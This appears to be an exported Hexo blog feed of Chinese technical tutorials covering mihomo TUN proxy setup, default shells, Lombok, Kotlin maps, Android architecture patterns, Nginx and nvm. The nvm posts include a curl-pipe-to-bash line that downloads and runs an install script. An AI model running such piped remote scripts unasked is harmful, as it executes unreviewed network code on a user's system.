<p>接下来访问对应的ip的控制面板<code>http://xxx.xxx.xxx.xxx/ui:9090</code>就可以控制你的<code>mihomo</code>代理了。</p>
<h1 id="配置TUN模式"><a href="#配置TUN模式" class="headerlink" title="配置TUN模式"></a>配置TUN模式</h1><p>解释：</p>
<blockquote>
<p>TUN 模式是 Windows 系统中的一种虚拟网络接口模式,全称为”TUNnel”模式。<br>TUN 模式会创建一个虚拟的点对点网络连接,这个连接会显得像一个真实的物理网络接口一样。它常用于创建 VPN(虚拟私有网络)连接。<br>TUN是三层设备 ，模拟一个网络层设备，操作第三层数据包比如 IP 数据包，TUN 虚拟网卡实现 IP 层隧道<br>Tun 模式通过新建一个 Tun 虚拟网卡接受操作系统的三层浏览流量，从而拓展 Clash 入口（inbound）转发能力，Tun 模式可以提升 Clash 处理 UDP 流量的能力，可以劫持任何三层流量，实现 DNS 劫持也是轻而易举，并且它与部分操作系统的网络栈结合也非常好，可以提升利用 iptables 等组件的能力</p>
</blockquote>
<p>相比于普通的全局代理模式(即配置http_proxy之类，详见我曾经的某篇文章<a href="https://zfxt.top/posts/9ff5edc2/?highlight=clash">clash快速开启和关闭代理模式</a>)</p>
<p>TUN模式会从网络层，将所有的数据都进行转发。(解决了一些：docker必须单独配置主动代理，docker内容器无法走代理以及一些系统层面不走普通代理的问题) 这种模式在我平常玩路由器配置<code>openclash</code>的时候，一般都称之为<code>透明代理</code>。而这才是我最需要的功能。</p>
<h2 id="开启流量转发"><a href="#开启流量转发" class="headerlink" title="开启流量转发"></a>开启流量转发</h2><ol>
<li><p>编辑<code>/etc/sysctl.conf</code>文件</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /etc/sysctl.conf</span><br></pre></td></tr></table></figure>
</li>
<li><p>将以下代码取消注释</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">net.ipv4.ip_forward=1</span><br><span class="line">net.ipv6.conf.all.forwarding=1</span><br></pre></td></tr></table></figure>
</li>
<li><p>加载内核参数</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sysctl -p</span><br></pre></td></tr></table></figure></li>
</ol>
<p>具体的TUN配置已经在上面的<code>config.yaml</code>中配置完了。所以到这里为止。我们就可以愉快的玩耍了！<br>(声明，我并没有使用fake-ip模式。考虑原因的话，我觉得我不是特别需要很好的性能，相对而言可以直观的看到ping通的信号更加方便)<br>关于如何使用路由器实现<code>透明代理</code>的话，我以后再出篇博客重新讲。</p>
<p>部分引用自<a href="https://zhichao.org/posts/c4fc1f">Linux 安装 Clash 内核并开启透明代理</a></p>
]]></content>
      <tags>
        <tag>代理</tag>
        <tag>mihomo</tag>
        <tag>服务器</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux默认使用bash</title>
    <url>/posts/4f1bd4e/</url>
    <content><![CDATA[<blockquote>
<p>最近在玩服务器的时候，发现新添加的用户user默认使用的是sh而不会是bash,这就导致使用起来很不习惯</p>
</blockquote>
<h2 id="有最高权限"><a href="#有最高权限" class="headerlink" title="有最高权限"></a>有最高权限</h2><ol>
<li><p>以具有sudo权限的管理员用户登录到Linux系统。</p>
</li>
<li><p>打开终端或命令行界面。</p>
</li>
<li><p>编辑 <code>/etc/passwd</code> 文件，可以使用任何文本编辑器，如<code>vi</code>或<code>nano</code>。在终端中运行以下命令打开该文件：</p>
</li>
</ol>
<p><code>sudo vi /etc/passwd</code></p>
<ol start="4">
<li>在该文件中找到你想要修改的普通用户的行。每个用户的行看起来类似于：</li>
</ol>
<p><code>username:x:1000:1000:User Name:/home/username:/bin/sh</code></p>
<p>注意到最后的 <code>/bin/sh</code>，这是默认的受限shell。我们需要将其更改为 <code>/bin/bash</code>，以便用户登录后进入bash。</p>
<ol start="6">
<li>现在，当该用户登录时，他们将默认进入bash shell。</li>
</ol>
<h2 id="没有sudo权限"><a href="#没有sudo权限" class="headerlink" title="没有sudo权限"></a>没有sudo权限</h2><p>如果你没有sudo权限的管理员用户，但仍希望将默认shell更改为bash，你可以尝试以下方法：</p>
<p>步骤：</p>
<ol>
<li>以当前普通用户登录到Linux系统。</li>
<li>打开终端或命令行界面。</li>
<li>检查当前用户可以使用的shell列表，可以使用以下命令：</li>
</ol>
<p><code>cat /etc/shells</code></p>
<p>这将显示系统上可用的shell列表。确保bash（<code>/bin/bash</code>）在列表中。</p>
<ol>
<li>使用 <code>chsh</code> 命令更改当前用户的默认shell。运行以下命令：</li>
</ol>
<p><code>chsh -s /bin/bash</code></p>
<p>系统会要求你输入当前用户的密码进行验证。</p>
<ol>
<li>输入密码后，<code>chsh</code> 命令将会将默认shell更改为bash。</li>
<li>退出当前会话，并重新登录。你将会进入bash shell作为默认shell。</li>
</ol>
]]></content>
      <categories>
        <category>Linux基础</category>
      </categories>
  </entry>
  <entry>
    <title>Lombok注解简化Java代码开发</title>
    <url>/posts/1a6b91a4/</url>
    <content><![CDATA[<h2 id="如何导入"><a href="#如何导入" class="headerlink" title="如何导入"></a>如何导入</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.projectlombok&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;lombok&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">1.18</span><span class="number">.4</span>&lt;/version&gt;</span><br><span class="line">    &lt;scope&gt;provided&lt;/scope&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
<p>@Setter 注解在类或字段，注解在类时为所有字段生成setter方法，注解在字段上时只为该字段生成setter方法。<br>@Getter 使用方法同上，区别在于生成的是getter方法。<br>@ToString 注解在类，添加toString方法。<br>@EqualsAndHashCode 注解在类，生成hashCode和equals方法。<br>@NoArgsConstructor 注解在类，生成无参的构造方法。<br>@RequiredArgsConstructor 注解在类，为类中需要特殊处理的字段生成构造方法，比如final和被@NonNull注解的字段。<br>@AllArgsConstructor 注解在类，生成包含类中所有字段的构造方法。<br>@Data 注解在类，生成setter&#x2F;getter、equals、canEqual、hashCode、toString方法，如为final属性，则不会为该属性生成setter方法。<br>@Slf4j 注解在类，生成log变量，严格意义来说是常量。private static final Logger log &#x3D; LoggerFactory.getLogger(UserController.class);</p>
<p>优点：</p>
<ul>
<li><p>能通过注解的形式自动生成构造器、getter&#x2F;setter、equals、hashcode、toString等方法，提高了一定的开发效率</p>
</li>
<li><p>让代码变得简洁，不用过多的去关注相应的方法</p>
</li>
<li><p>属性做修改时，也简化了维护为这些属性所生成的getter&#x2F;setter方法等<br>缺点：</p>
</li>
<li><p>不支持多种参数构造器的重载</p>
</li>
<li><p>虽然省去了手动创建getter&#x2F;setter方法的麻烦，但大大降低了源代码的可读性和完整性，降低了阅读源代码的舒适度</p>
</li>
</ul>
]]></content>
      <tags>
        <tag>JAVA</tag>
        <tag>Lombok</tag>
      </tags>
  </entry>
  <entry>
    <title>Map和MutableMap：键值对集合</title>
    <url>/posts/e94964a/</url>
    <content><![CDATA[<h1 id="记一个关于Map的知识"><a href="#记一个关于Map的知识" class="headerlink" title="记一个关于Map的知识"></a>记一个关于Map的知识</h1><p>kotlin中有Map和MutableMap两种</p>
<blockquote>
<p>Map是一个接口和通用的元素集合。 Map以键和值对的形式保存数据。 映射的键是唯一的，每个键只保留一个值。 键和值可以是不同类型。 也被分为可变的和不可变的，即Map与MutableMap.</p>
</blockquote>
<h2 id="Map"><a href="#Map" class="headerlink" title="Map"></a>Map</h2><p>它是不可变的，它的大小固定，方法支持只读访问。要使用Map接口，需要使用mapOf()或mapOf &lt;k，v&gt;()函数声明。<br>他的常用方法：<br>getValue(key)	它返回给定键的值，如果映射中没有这样的键，则抛出异常。<br>getOrDefault(key,defaultValue)	获取指定key值的value，没有值时返回默认值<br>contains(key)、containsKey(key)	它检查在Map中是否包含给定的键。<br>minus(key)	返回去除该 key-value的map<br>plus(pair)	向map中添加key - value<br>但这些方法不能对原Map产生改变。<br>需要改变的话需要使用</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line">map = map.plus(a to b)</span><br></pre></td></tr></table></figure>
<p>型如上的方法。</p>
<h2 id="MutableMap"><a href="#MutableMap" class="headerlink" title="MutableMap"></a>MutableMap</h2><p>MutableMap是集合框架的接口，它以键和值对的形式保存对象。 通过使用相应的键来检索MutableMap接口的值。 键和值可以是不同类型的对，它是可变的。</p>
<h3 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h3><p>MutableMap常用函数<br>函数	描述<br>put(key,value)、MutableMap[key]&#x3D;value	放入key-value对。如果原来已有key，value将被覆盖<br>putAll(Map)	向原map中添加整个map<br>remove(key)	删除指定key以及对应value<br>remove(key, value)	存在键和值实体时，才会删除它们<br>clear()	删除所有元素<br>contains(key)、containsKey(key)	检查是否包含给定键，如果map包含指定的键，则返回true<br>containsValue(value)	如果包含给定值的一个或多个键，则返回true<br>count()	它返回key-value对的总数<br>get(key)	返回与键对应的值，如果找不到指定键，则返回null<br>getOrDefault(key, defaultValue)	返回带有相应指定键的值，如果没有key对应的value，则返回默认值<br>getValue(key)	返回与给定键对应的值，如果找不到键，则抛出异常</p>
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>MVC MVP MVVM MVI架构</title>
    <url>/posts/c7f557a/</url>
    <content><![CDATA[<h1 id="MVC"><a href="#MVC" class="headerlink" title="MVC"></a>MVC</h1><p>Model：实体类(数据的获取、存储、数据状态变化)。<br>View：布局文件<br>Controller：Activity(处理数据、业务和UI)。<br>![](<a href="https://image.zfxt.top/hexo-blog/MVC">https://image.zfxt.top/hexo-blog/MVC</a> MVP MVVM MVI架构-2023-10-12-22-10.png)<br>缺点：<br>随着界面及其逻辑的复杂度不断提升，Activity类的职责不断增加，以致变得庞大臃肿。<br>为了解决MVC的缺点，MVP 框架被提出来。</p>
<h1 id="MVP"><a href="#MVP" class="headerlink" title="MVP"></a>MVP</h1><p>Model：实体类(数据的获取、存储、数据状态变化)。<br>View：布局文件+Activity。<br>Presenter：中介，负责完成View与Model间的交互和业务逻辑。<br>![](<a href="https://image.zfxt.top/hexo-blog/MVC">https://image.zfxt.top/hexo-blog/MVC</a> MVP MVVM MVI架构-2023-10-14-08-28.png)</p>
<ul>
<li>MVP的优点</li>
</ul>
<p>复杂的逻辑处理放在Presenter进行处理，减少了Activity的臃肿。<br>解耦。Model层与View层完全分离，修改V层不会影响M层，降低了耦合性。<br>可以将一个Presenter用于多个视图，而不需要改变Presenter的逻辑。<br>Presenter层与View层的交互是通过接口来进行的，便于单元测试。</p>
<ul>
<li>MVP的缺点</li>
</ul>
<p><strong>维护困难</strong>。Presenter中除了业务逻辑以外，还有大量的View-&gt;Model，Model-&gt;View的手动同步逻辑，造成Presenter比较笨重，维护起<strong>来会比较困难。<br>接口膨胀</strong></p>
<h1 id="MVVM"><a href="#MVVM" class="headerlink" title="MVVM"></a>MVVM</h1><p>Model：实体类(数据的获取、存储、数据状态变化)。<br>View：布局文件+Activity。<br>ViewModel： 关联层，将Model和View进行绑定，Model或View更改时，实时刷新对方。<br>![](<a href="https://image.zfxt.top/hexo-blog/MVC">https://image.zfxt.top/hexo-blog/MVC</a> MVP MVVM MVI架构-2023-10-15-20-41.png)</p>
<ol>
<li>提高可维护性。Data Binding可以实现双向的交互，使得视图和控制层之间的耦合程度进一步降低，分离更为彻底，同时减轻了Activity的压力。</li>
<li>简化测试。因为同步逻辑是交由Binder做的，View跟着Model同时变更，所以只需要保证Model的正确性，View就正确。大大减少了对View同步更新的测试。</li>
<li>ViewModle易于单元测试。</li>
</ol>
<h1 id="MVI"><a href="#MVI" class="headerlink" title="MVI"></a>MVI</h1><p>Model: 与MVVM中的Model不同的是，MVI的Model主要指UI状态（State）。例如页面加载状态、控件位置等都是一种UI状态<br>View: 与其他MVX中的View一致，可能是一个Activity或者任意UI承载单元。MVI中的View通过订阅Model的变化实现界面刷新<br>Intent: 此Intent不是Activity的Intent，用户的任何操作都被包装成Intent后发送给Model层进行数据请求<br>![](<a href="https://image.zfxt.top/hexo-blog/MVC">https://image.zfxt.top/hexo-blog/MVC</a> MVP MVVM MVI架构-2023-10-18-27-35.png)</p>
<h2 id="单向数据流"><a href="#单向数据流" class="headerlink" title="单向数据流"></a>单向数据流</h2><p>MVI强调数据的单向流动，主要分为以下几步：<br>![](<a href="https://image.zfxt.top/hexo-blog/MVC">https://image.zfxt.top/hexo-blog/MVC</a> MVP MVVM MVI架构-2023-10-19-11-25.png)</p>
<ol>
<li>用户操作以Intent的形式通知Model</li>
<li>Model基于Intent更新State</li>
<li>View接收到State变化刷新UI。</li>
</ol>
<p>![](<a href="https://image.zfxt.top/hexo-blog/MVC">https://image.zfxt.top/hexo-blog/MVC</a> MVP MVVM MVI架构-2023-10-19-48-07.png)<br>MVI有以下优势</p>
<p>强调数据单向流动，很容易对状态变化进行跟踪和回溯<br>使用ViewState对State集中管理，只需要订阅一个 ViewState 便可获取页面的所有状态，相对 MVVM 减少了不少模板代码<br>ViewModel通过ViewState与Action通信，通过浏览ViewState 和 Aciton 定义就可以理清 ViewModel 的职责，可以直接拿来作为接口文档使用。</p>
<p>当然MVI也有一些缺点，比如</p>
<p>所有的操作最终都会转换成State，所以当复杂页面的State容易膨胀<br>state是不变的，因此每当state需要更新时都要创建新对象替代老对象，这会带来一定内存开销</p>
<blockquote>
<p>该文引用自(稀土掘金)[<a href="https://juejin.cn/post/7043716896767606798]">https://juejin.cn/post/7043716896767606798]</a></p>
</blockquote>
]]></content>
      <categories>
        <category>Android入门</category>
      </categories>
      <tags>
        <tag>MVI</tag>
        <tag>架构</tag>
      </tags>
  </entry>
  <entry>
    <title>Nginx URI 匹配和位置配置</title>
    <url>/posts/8e6632a6/</url>
    <content><![CDATA[<h2 id="location配置"><a href="#location配置" class="headerlink" title="location配置"></a>location配置</h2><ul>
<li>匹配 URI 类型，有四种参数可选，当然也可以不带参数。</li>
<li>命名location，用@来标识，类似于定义goto语句块。<br><img src="https://memos.zfxt.top/o/r/56/c5dda793-20af-4501-b1a2-2b17f80d33ce/image.png" alt="image"><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">1. location =    <span class="comment"># 精准匹配</span></span><br><span class="line">2. location ^~   <span class="comment"># 带参前缀匹配</span></span><br><span class="line">3. location ~    <span class="comment"># 正则匹配（区分大小写）</span></span><br><span class="line">4. location ~*   <span class="comment"># 正则匹配（不区分大小写）</span></span><br><span class="line">5. location /a   <span class="comment"># 普通前缀匹配，优先级低于带参数前缀匹配。</span></span><br><span class="line">6. location /    <span class="comment"># 任何没有匹配成功的，都会匹配这里处理</span></span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <tags>
        <tag>nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>Mock助力前端后端异步开发</title>
    <url>/posts/dad39b92/</url>
    <content><![CDATA[<h2 id="ApiFox"><a href="#ApiFox" class="headerlink" title="ApiFox"></a>ApiFox</h2><p>在使用apifox时，才深知mock的作用。简直不要太好用了呀。<br>在没有mock的时候，前端和后端分开开发，必须要等后端把功能完善好了才可以获取到数据，而这往往会降低开发效率，前端必须等后端开发完才能开始开发（这里指的是那种依托后端数据的情况）。<br>同时在后端开发后，往往需要API文档，前端才能够完成正确的开发。非常的耗时耗力。而这。也正是apifox解决的问题所在。<br><img src="https://memos.zfxt.top/o/r/48/6d28f7db-c494-4682-966c-ccbbae387cc1/1685687579_image.png" alt="image"></p>
<h2 id="简单来说，mock就是用来模拟数据给前端去使用的。前端通过mock可以与后端实现异步开发。大大的提高效率，而且通过apifox不仅实现了前后端快速开发。而且使得api文档也可以快速生成。"><a href="#简单来说，mock就是用来模拟数据给前端去使用的。前端通过mock可以与后端实现异步开发。大大的提高效率，而且通过apifox不仅实现了前后端快速开发。而且使得api文档也可以快速生成。" class="headerlink" title="简单来说，mock就是用来模拟数据给前端去使用的。前端通过mock可以与后端实现异步开发。大大的提高效率，而且通过apifox不仅实现了前后端快速开发。而且使得api文档也可以快速生成。"></a>简单来说，mock就是用来模拟数据给前端去使用的。前端通过mock可以与后端实现异步开发。大大的提高效率，而且通过apifox不仅实现了前后端快速开发。而且使得api文档也可以快速生成。</h2><p>以上只是帮助理解mock的含义和概念，具体使用请查看apifox的官方文档</p>
<blockquote>
<p>引用自<a href="https://juejin.cn/post/7048916480032768013">掘金</a></p>
</blockquote>
]]></content>
      <tags>
        <tag>mock</tag>
      </tags>
  </entry>
  <entry>
    <title>NVM的安装和使用</title>
    <url>/posts/5a6c750f/</url>
    <content><![CDATA[<p>#nvm</p>
<ul>
<li>node：是一个基于 Chrome V8 引擎的 JS 运行环境。</li>
<li>npm：是 node.js 默认的包管理系统（用 JavaScript 编写的），在安装的 node 的时候，npm 也会跟着一起安装，管理 node 中的第三方插件。</li>
<li>npx：npm 从 v5.2.0 开始新增了 npx 命令，&gt;&#x3D; 该版本会自动安装 npx，附带：npx 有什么作用跟意义？为什么要有 npx？什么场景使用？。</li>
<li>nrm：是一个 npm 源管理工具，使用它可以快速切换 npm 源，默认是官方源，当 npm 下载包过慢时，可能需要切换到第三方源（例如：淘宝、科大…），还有公司私有源地址等等。</li>
<li>nvm：node 版本管理器，也就是说：一个 nvm 可以管理多个 node 版本（包含 npm 与 npx），可以方便快捷的 安装、切换 不同版本的 node。</li>
</ul>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>nvm的安装只需要执行以下一条命令<br>linux下</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.3/install.sh | bash</span><br></pre></td></tr></table></figure>
<p>windows下，直接去官网，即可下载得到正版</p>
<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">nvm list // 查看安装的所有node的版本</span><br><span class="line">​</span><br><span class="line">nvm list available // 查看当前可安装的版本</span><br><span class="line">​</span><br><span class="line">nvm install xx.xx.xx  // 安装xx.xx.xx版本的node</span><br><span class="line">​</span><br><span class="line">nvm use xx.xx.xx // 使用（切换到）xx.xx.xx版本的node</span><br><span class="line">​</span><br><span class="line">nvm uninstall xx.xx.xx  // 卸载xx.xx.xx版本的node</span><br><span class="line">​</span><br><span class="line">nvm <span class="built_in">arch</span> // 显示node是运行在32位还是64位。</span><br><span class="line">​</span><br><span class="line">nvm on // 开启node.js版本管理</span><br><span class="line">​</span><br><span class="line">nvm off // 关闭node.js版本管理</span><br><span class="line">​</span><br><span class="line">nvm proxy [url] // 设置下载代理。不加可选参数url，显示当前代理。将url设置为none则移除代理。</span><br><span class="line">​</span><br><span class="line">nvm node_mirror [url] // 设置node镜像。默认是https://nodejs.org/dist/。如果不写url，则使用默认url。设置后可至安装目录settings.txt文件查看，也可直接在该文件操作。</span><br><span class="line">nvm npm_mirror [url] // 设置npm镜像。https://github.com/npm/cli/archive/。如果不写url，则使用默认url。设置后可至安装目录settings.txt文件查看，也可直接在该文件操作。</span><br><span class="line">​</span><br><span class="line">nvm root [path] // 设置存储不同版本node的目录。如果未设置，默认使用当前目录。</span><br></pre></td></tr></table></figure>
<h2 id="换源"><a href="#换源" class="headerlink" title="换源"></a>换源</h2><p>在linux下，可以在<code>/etc/profile</code>或者<code>~/.bashrc</code>定义全局变量,然后source去刷新</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> NVM_NODEJS_ORG_MIRROR=https://npmmirror.com/mirrors/node</span><br></pre></td></tr></table></figure>
<p>在windows下，修改nvm配置目录的<code>setting.txt</code>文件<br>加上</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">node_mirror: https://npmmirror.com/mirrors/node/</span><br><span class="line">npm_mirror: https://npmmirror.com/mirrors/npm/</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>nvm</category>
      </categories>
  </entry>
  <entry>
    <title>Nginx：高性能Web服务器及代理</title>
    <url>/posts/ef8bc635/</url>
    <content><![CDATA[<h1 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h1><ol>
<li>基本概念：<ul>
<li><p>一个高性能的http和反向代理web服务器，能支持高负载，效率高</p>
</li>
<li><p>正向代理<br>通过代理服务器访问服务器，例如搭建梯子才访问<a href="http://www.google.com.(可以隐藏客户端的信息)这个内容就叫正向代理/">www.google.com。（可以隐藏客户端的信息）这个内容就叫正向代理</a></p>
</li>
<li><p>反向代理<br>一般情况下是<br><img src="/./o/r/25/78dd3819-7f75-4f36-9cfd-25d15ded3b45/1681888877_image.png" alt="image"><br>就是客户端对代理无感知，只是通过代理服务器去隐藏目标服务器的具体信息，只暴露代理服务器的地址，隐藏真实服务器的地址。<br>反向代理后，客户端无法知道服务器的具体位置。</p>
</li>
<li><p>负载均衡</p>
</li>
</ul>
</li>
</ol>
<p>默认情况下，是一个服务器，前后连锁相关。<br><img src="/./o/r/26/7b2fc7c9-dffd-4a47-811e-c6f478dd5b4e/1681889535_image.png" alt="image"><br>将原先集中到单个服务器上的情况改为请求分发到多个服务器上。<br><img src="/./o/r/27/8b32e267-0259-4b4d-9f28-098b3390fa05/1681890458_image.png" alt="image"><br>    - 动静分离<br>实际上就是前后端分离，nginx可以直接放前端的静态资源，而后端单独部署。<br>2. 安装，配置</p>
<ul>
<li>先安装依赖项(以centos7.8为例）<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">yum update</span><br><span class="line">yum -y install make zlib zlib-devel gcc-c++ libtool openssl openssl-devel pcre pcre-devel</span><br><span class="line"><span class="comment">#下载稳定版安装包</span></span><br><span class="line">wget https://nginx.org/download/nginx-1.24.0.tar.gz</span><br><span class="line">tar -zxvf nginx-1.24.0.tar.gz </span><br><span class="line"><span class="built_in">cd</span> nginx-1.24.0</span><br><span class="line"><span class="comment">#配置并安装</span></span><br><span class="line">./configure --prefix=/usr/local/nginx --conf-path=/usr/local/nginx/conf/nginx.conf --pid-path=/usr/local/nginx/conf/nginx.pid --lock-path=/usr/local/nginx/lock/nginx.lock --with-http_ssl_module</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure></li>
</ul>
<p>3. </p>
<ul>
<li>在<code>/usr/local/nginx/sbin/</code>目录下,可以使用nginx的常用命令。（不方便，可以加入到path环境变量中）<br>  查看版本号<code>./nginx -v</code>启动nginx<code>./nginx</code>关闭nginx<code>./nginx -s stop</code>重新加载配置<code>./nginx -s reload</code></li>
<li>设置nginx为系统服务，<br>在<code>/usr/lib/systemd/system</code>目录下添加<code>nginx.service</code><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=nginx - high performance web server</span><br><span class="line">Documentation=http://nginx.org/en/docs/</span><br><span class="line">After=network.target remote-fs.target nss-lookup.target</span><br><span class="line"> </span><br><span class="line">[Service]</span><br><span class="line">Type=forking</span><br><span class="line">PIDFile=/usr/local/nginx/logs/nginx.pid</span><br><span class="line">ExecStartPre=/usr/local/nginx/sbin/nginx -t -c /usr/local/nginx/conf/nginx.conf</span><br><span class="line">ExecStart=/usr/local/nginx/sbin/nginx -c /usr/local/nginx/conf/nginx.conf</span><br><span class="line">ExecReload=/bin/kill -s HUP <span class="variable">$MAINPID</span></span><br><span class="line">ExecStop=/bin/kill -s QUIT <span class="variable">$MAINPID</span></span><br><span class="line">PrivateTmp=<span class="literal">true</span></span><br><span class="line"> </span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure>
然后启动nginx并设置开机自启动<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl start nginx</span><br><span class="line">systemctl <span class="built_in">enable</span> nginx</span><br><span class="line">systemctl status nginx <span class="comment">#查看状态</span></span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="4">
<li>配置文件</li>
<li><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">worker_processes  1;</span><br><span class="line"></span><br><span class="line">events &#123;</span><br><span class="line">    worker_connections  1024;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http &#123;</span><br><span class="line">    include       mime.types;</span><br><span class="line">    default_type  application/octet-stream;</span><br><span class="line">    sendfile        on;</span><br><span class="line">    keepalive_timeout  65;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        listen       80;</span><br><span class="line">        server_name  localhost;</span><br><span class="line"></span><br><span class="line">        location / &#123;</span><br><span class="line">            root   html;</span><br><span class="line">            index  index.html index.htm;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        error_page   500 502 503 504  /50x.html;</span><br><span class="line">        location = /50x.html &#123;</span><br><span class="line">            root   html;</span><br><span class="line">        &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></li>
<li>全局块<br> 设置整体运行的配置指令<br> <code>worker_processes  1;</code>值越大，处理并发的数量越多</li>
<li>events块<br> 设置nginx服务器和用户的网络连接<br> <code>work process 1024;</code>表示最大支持1024个连接数</li>
<li>http块<ul>
<li>http全局块</li>
<li>server块(和虚拟主机有重要关系)</li>
</ul>
</li>
</ol>
<ul>
<li>每个 http 块可以包括多个 server 块，而每个 server 块就相当于一个虚拟主机。而每个 server 块也分为全局 server 块，以及可以同时包含多个 locaton 块。（☆☆☆☆☆）</li>
</ul>
<ol start="5">
<li>反向代理实例</li>
</ol>
<ul>
<li>实例1<br>在<code>/usr/local/nginx/conf/nginx.conf</code>文件中。<br>修改其http块中的server块中的location</li>
</ul>
<p>补充：location 指令说明</p>
<p>该指令用于匹配 URL， 语法如下：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="string">location</span> [ <span class="string">=</span> <span class="string">|</span> <span class="string">~</span> <span class="string">|</span> <span class="string">~*</span> <span class="string">|</span> <span class="string">^~</span>] <span class="string">uri</span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>=</code> ：用于不含正则表达式的 uri 前，要求请求字符串与 uri 严格匹配， 如果匹配成功，就停止继续向下搜索并立即处理该请求。</li>
<li><code>~</code>：用于表示 uri 包含正则表达式，并且区分大小写。</li>
<li><code>~*</code>：用于表示 uri 包含正则表达式，并且不区分大小写。</li>
<li><code>^~</code>：用于不含正则表达式的 uri 前，要求 Nginx 服务器找到标识 uri 和请求</li>
</ul>
<blockquote>
<p>字符串匹配度最高的 location 后，立即使用此 location 处理请求，而不再使用 location块中的正则 uri 和请求字符串做匹配。<br>6. 动静分离<br>7. nginx配置高可用集群</p>
</blockquote>
]]></content>
      <tags>
        <tag>linux</tag>
        <tag>nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>Node.js 工具集：npm、npx、nrm、nvm</title>
    <url>/posts/7f6c5dad/</url>
    <content><![CDATA[<ul>
<li><p>node：是一个基于 Chrome V8 引擎的 JS 运行环境。</p>
</li>
<li><p>npm：是 node.js 默认的包管理系统（用 JavaScript 编写的），在安装的 node 的时候，npm 也会跟着一起安装，管理 node 中的第三方插件。</p>
</li>
<li><p>npx：npm 从 v5.2.0 开始新增了 npx 命令，&gt;&#x3D; 该版本会自动安装 npx，附带：npx 有什么作用跟意义？为什么要有 npx？什么场景使用？。</p>
</li>
<li><p>nrm：是一个 npm 源管理工具，使用它可以快速切换 npm 源，默认是官方源，当 npm 下载包过慢时，可能需要切换到第三方源（例如：淘宝、科大…），还有公司私有源地址等等。</p>
</li>
<li><p>nvm：node 版本管理器，也就是说：一个 nvm 可以管理多个 node 版本（包含 npm 与 npx），可以方便快捷的 安装、切换 不同版本的 node。</p>
</li>
</ul>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>nvm的安装只需要执行以下一条命令<br>linux下</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.3/install.sh | bash</span><br></pre></td></tr></table></figure>
<p>windows下，直接去官网，即可下载得到正版</p>
<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">nvm list // 查看安装的所有node的版本</span><br><span class="line">​</span><br><span class="line">nvm list available // 查看当前可安装的版本</span><br><span class="line">​</span><br><span class="line">nvm install xx.xx.xx  // 安装xx.xx.xx版本的node</span><br><span class="line">​</span><br><span class="line">nvm use xx.xx.xx // 使用（切换到）xx.xx.xx版本的node</span><br><span class="line">​</span><br><span class="line">nvm uninstall xx.xx.xx  // 卸载xx.xx.xx版本的node</span><br><span class="line">​</span><br><span class="line">nvm <span class="built_in">arch</span> // 显示node是运行在32位还是64位。</span><br><span class="line">​</span><br><span class="line">nvm on // 开启node.js版本管理</span><br><span class="line">​</span><br><span class="line">nvm off // 关闭node.js版本管理</span><br><span class="line">​</span><br><span class="line">nvm proxy [url] // 设置下载代理。不加可选参数url，显示当前代理。将url设置为none则移除代理。</span><br><span class="line">​</span><br><span class="line">nvm node_mirror [url] // 设置node镜像。默认是https://nodejs.org/dist/。如果不写url，则使用默认url。设置后可至安装目录settings.txt文件查看，也可直接在该文件操作。</span><br><span class="line"></span><br><span class="line">nvm npm_mirror [url] // 设置npm镜像。https://github.com/npm/cli/archive/。如果不写url，则使用默认url。设置后可至安装目录settings.txt文件查看，也可直接在该文件操作。</span><br><span class="line">​</span><br><span class="line">nvm root [path] // 设置存储不同版本node的目录。如果未设置，默认使用当前目录。</span><br></pre></td></tr></table></figure>

<h2 id="换源"><a href="#换源" class="headerlink" title="换源"></a>换源</h2><p>在linux下，可以在<code>/etc/profile</code>或者<code>~/.bashrc</code>定义全局变量,然后source去刷新</p>
